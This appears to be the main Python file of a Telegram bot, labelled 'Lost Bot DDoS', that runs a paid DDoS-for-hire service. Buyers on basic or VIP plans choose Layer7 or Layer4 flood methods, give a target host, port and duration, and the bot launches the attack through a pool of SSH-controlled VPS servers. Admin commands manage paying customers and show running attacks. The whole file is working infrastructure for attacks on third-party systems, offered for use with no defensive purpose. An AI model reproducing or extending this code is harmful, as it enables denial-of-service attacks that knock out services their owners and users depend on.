import telebot, requests, threading, time, datetime, paramiko, json, sys
import os, telebot, asyncio, socket

from datetime import datetime
from colorama import Fore, init
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from funcs.handle_methods import *
from funcs.launch_attack import launch_attacks
from funcs.api_attack import launch_attack_api
from command.tracker import checkhost, ipinfo
from command.menu import *
from command.admin import *

try:
  with open('./config.json', 'r') as f:
    config = json.load(f)
except FileNotFoundError:
  config = {}
  
bot = telebot.TeleBot(config['TOKEN'])

selected_attack = {}
cooldowns = {}
successful_attacks = []
all_method = ['HTTPS', 'TLS', 'STROM', 'POWER']

with open("./data/vps_servers.json") as file:
  vps_list = json.load(file)

with open("./data/database.json") as e:
  db = json.load(e)
  
with open("./data/methods.json") as e:
  methods_data = json.load(e)
  
with open("./data/admin.json") as e:
  admin = json.load(e)
  admins = admin["admin"]

def check_vps_connection(vps_address, username, password, timeout=5):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(vps_address, username=username, password=password, timeout=timeout)
    ssh.close()
    return True
  except paramiko.AuthenticationException:
    return False
  except paramiko.SSHException as ssh_err:
    return False
  except TimeoutError:
    print("Error: Connection to VPS timed out. Check VPS accessibility and SSH configuration.")
    sys.exit(1)
        
def is_valid_userid(user_id):
    with open("./data/database.json", "r") as file:
        data = json.load(file)
        
    userid = str(user_id)
    if userid not in data['userid']:
      return False
    
    if userid in data['userid']:
        if datetime.strptime(data['userid'][userid]['exp'], '%Y-%m-%d') < datetime.now():
            del data['userid'][userid]
            
            with open("./data/database.json", "w") as file:
                json.dump(data, file, indent=4)
                
            return False
        else:
            return True
    else:
        return False
        
def is_on_cooldown(user_id, cooldown):
    cooldown_timestamp = cooldowns.get(user_id, 0)
    current_time = time.time()
    if current_time < cooldown_timestamp:
        return True 
    else:
        cooldowns[user_id] = current_time + int(cooldown)
        return False
        
@bot.message_handler(commands=['help'])
def help(message):
  help_cmd = """
Information Command :
- /methods - Show attack methods.
- /attack - Sent attack.
- /myid - Check yout id.
- /myplans - Check your plans.
- /admin - Admin access.

Tracker Command :
- /checkhost - Check url.
- /ipinfo - Track IP/URL.
  """
  bot.reply_to(message, help_cmd)

@bot.message_handler(commands=['methods'])
def method_menu(message):
    mes = "List Methods:\n"
    
    mes += "Basic:\n"
    for basic in methods_data["methods"]["basic"]:
        mes += f"- {basic}\n"
        
    mes += "\nVIP:\n"
    for vip in methods_data["methods"]["vip"]:
        mes += f"- {vip}\n"
    
    bot.reply_to(message, mes)
  
@bot.message_handler(commands=['running'])
def handle_running_command(message):
    chat_id = message.chat.id
    if len(successful_attacks) == 0:
        bot.send_message(chat_id, 'Nobody carried out an attack.')
    else:
        for attack in successful_attacks[:]:
            user_id = attack["user_id"]
            username = check_username(user_id)
            host = attack["host"]
            port = attack["port"]
            duration = int(attack["duration"])
            method = attack["method"]
            start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')

            info = db["userid"].get(str(user_id))
            if info and info.get('curCons', 0) > 0:
                remaining_time = duration - (datetime.now() - start_time).total_seconds()
                if remaining_time > 0:
                    remaining_time_str = f'{int(remaining_time)} seconds'
                    message_text += f'Username: @{username}\n User ID: {user_id}\nTarget: {host}\nPort: {port}\nTime Remaining: {remaining_time_str}\nMethod: {method}\n\n'
                else:
                    successful_attacks.remove(attack)
                    
        bot.send_message(chat_id, message_text)
        
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
  global is_valid_userid
  user_id = message.from_user.id
  info = db["userid"][str(user_id)]
  user_cd = info.get('cooldown', 60)
  if not is_valid_userid(user_id):
    bot.reply_to(message, f'You havent purchased a plan yet.')
    return
  
  if is_on_cooldown(user_id, user_cd):
    bot.reply_to(message, "You are on cooldown. Please wait before using this command again.")
    return
  
  show_layer(int(message.chat.id))
    
@bot.message_handler(func=lambda message: message.text == 'Layer7')
def handle_selection(message):
  user_id = message.from_user.id
  info = db["userid"][str(user_id)]
  user_plan = info.get('plans', ' ')
  
  if user_plan.upper() == "BASIC":
    show_methods_layer7b(message.chat.id)
  else:
    show_methods_layer7v(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text == 'Layer4')
def handle_selection(message):
    show_methods_layer4(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text in all_method)
def handle_method_selection(message):
    user_id = message.from_user.id
    selected_method = message.text
    info = db["userid"][str(user_id)]
    user_plan = info.get('plans', ' ')
      
    selected_attack[message.chat.id] = selected_method
    bot.reply_to(message, 'Please enter the host and time\n(e.g., https://example.com 60):')
    bot.register_next_step_handler(message, handle_attack_layer7)
    
@bot.message_handler(func=lambda message: message.text in ['UDP', 'TCP'])
def handle_method_selection(message):
    selected_attack[message.chat.id] = message.text
    bot.reply_to(message, 'Please enter the [host] [port] [time]\n(e.g., 121.231.232.34 22 60):')
    bot.register_next_step_handler(message, handle_attack_layer4)
    
@bot.message_handler(func=lambda message: message.text == '❌ Cancel')
def handle_cancel(message):
    bot.reply_to(message, 'Cancelled', reply_markup=telebot.types.ReplyKeyboardRemove())

def handle_attack_layer7(message):
    user_id = message.from_user.id
    info = db['userid'][str(user_id)]
    max_duration = info['maxTime']
    max_conc = info['maxCons']
    concurrents = info.get('curCons', 0)
    
    texts = message.text.split(' ')
    if len(texts) != 2:
        bot.reply_to(message, 'Please enter host and time\nExample : https://example.com 60\n\nPlease choice methods again.')
        return
    
    host = str(texts[0].strip())
    time = str(texts[1].strip())
    method = selected_attack.get(message.chat.id)
    
    if 'http://' in host:
      port = '80'
    elif 'https://' in host:
      port = '443'
    else:
      bot.send_message(message, 'Invalid URL')
      return
    
    if int(time) > max_duration:
      bot.reply_to(message, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
      return
    
    if int(concurrents) >= int(max_conc):
      bot.reply_to(message, f"You've reached max concurrent limits, your limit is {max_conc}.")
      return
    
    userid = str(user_id)
    db["userid"][userid]["curCons"] += 1
    with open("./data/database.json", "w") as json_file:
      json.dump(db, json_file, indent=4)
      
    #launch_attack_api(f"YOUR API DDOS")
    launch_attacks(method, host, port, time)
    bot.reply_to(message, f"""
Attack launch
🎯 Target : {host}
🔸 Port : {port}
💫 Time : {time}
🀄 Methods : {method}
    """, reply_markup=telebot.types.ReplyKeyboardRemove())
    attack_info = {
        'host': host,
        'port': port,
        'duration': time,
        'method': method,
        'user_id': user_id,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)
        
def handle_attack_layer4(message):
    user_id = message.from_user.id
    info = db['userid'][str(user_id)]
    max_duration = info['max_duration']
    max_conc = info['maxCons']
    concurrents = info.get('curCons', 0)
    
    texts = message.text.split(' ')
    if len(texts) != 3:
        bot.reply_to(message, 'Please enter host and time\nExample : https://example.com 60\n\nPlease choice methods again.')
        return
    
    host = str(texts[0].strip())
    port = str(texts[1].strip())
    time = int(texts[2].strip())
    method = selected_attack.get(message.chat.id)
    
    if int(time) > max_duration:
        bot.reply_to(message, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
        return
    
    if int(concurrents) >= int(max_conc):
      bot.reply_to(message, f"You've reached max concurrent limits, your limit is {max_conc}.")
      return
    
    userid = str(user_id)
    db["userid"][userid]["curCons"] += 1
    with open("./data/database.json", "w") as json_file:
      json.dump(db, json_file, indent=4)
      
    #launch_attack_api(f"YOUR API DDOS")
    launch_attacks(methods, host, port, time)
    bot.reply_to(message, f"""
Attack launch
🎯 Target : {host}
🔸 Port : {port}
💫 Time : {time}
🀄 Methods : {method}
    """, reply_markup=telebot.types.ReplyKeyboardRemove())
    
    attack_info = {
        'host': host,
        'port': port,
        'duration': time,
        'method': method,
        'user_id': user_id,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)


"""
COMMAND
"""

@bot.message_handler(commands=['myplans'])
def my_plan(message):
  my_plans(message)
  
@bot.message_handler(commands=['myid'])
def my_id(message):
  user_id = message.from_user.id
  bot.reply_to(message, f"Your id is : {user_id}")

@bot.message_handler(commands=['checkhost'])
def check_host(message):
  checkhost(message)

@bot.message_handler(commands=['ipinfo'])
def ip_info(message):
  ipinfo(message)
  
"""
ADMINS COMMANDS
"""

@bot.message_handler(commands=['admin'])
def help_admin(message):
  user_id = message.from_user.id
  if user_id not in admins:
    bot.reply_to(message, f'You not admin access.')
    return
  
  help_cmd = """
- /addplans - Add plans buyer
- /removeplans - Remove plans
- /userlist - Check user list
- /running - Check user attack
- /server - Check online server
- /updateplans - Update user plans
  """
  bot.reply_to(message, help_cmd)
  
@bot.message_handler(commands=['addplans'])
def add_plans(message):
  addplans(message)

@bot.message_handler(commands=['removeplans'])
def remove_plans(message):
  removeplans(message)

@bot.message_handler(commands=['userlist'])
def user_list(message):
  userlist(message)

@bot.message_handler(commands=['addserver'])
def add_server(message):
  addserver(message)
  
@bot.message_handler(commands=['updateplans'])
def update_user(message):
  updateuser(message)
  
@bot.message_handler(commands=['server'])
def check_server(message):
  user_id = message.from_user.id
  if user_id not in admins:
    bot.reply_to(message, f'You not admin access.')
    return
  
  connected_count = 0
  for vps in vps_list:
    vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
    if vps_connection_status == True:
      connected_count += 1
    else:
      bot.reply_to(message, f"Hostname {vps['hostname']} failed to connect")
  bot.reply_to(message, f"Total servers connect : {connected_count}")

if __name__ == "__main__":
  os.system('clear')
  init()
  print(Fore.WHITE,"""
▒█░░░ █▀▀█ █▀▀ ▀▀█▀▀ 　 ▒█▀▀█ █▀▀█ ▀▀█▀▀ 
▒█░░░ █░░█ ▀▀█ ░░█░░ 　 ▒█▀▀▄ █░░█ ░░█░░ 
▒█▄▄█ ▀▀▀▀ ▀▀▀ ░░▀░░ 　 ▒█▄▄█ ▀▀▀▀ ░░▀░░""", Fore.RESET)
  print(Fore.MAGENTA, "Code by Jxdn", Fore.RESET)
  print(Fore.BLUE, "Lost Bot DDoS Started.", Fore.RESET)
  connected_count = 0
  for vps in vps_list:
    vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
    if vps_connection_status == True:
      connected_count += 1
    else:
      print(Fore.RED, f"[Warning] Hostname {vps['hostname']} failed to connect", Fore.RESET)
  print(f"[System] Total servers connect : {connected_count}")
  bot.infinity_polling()
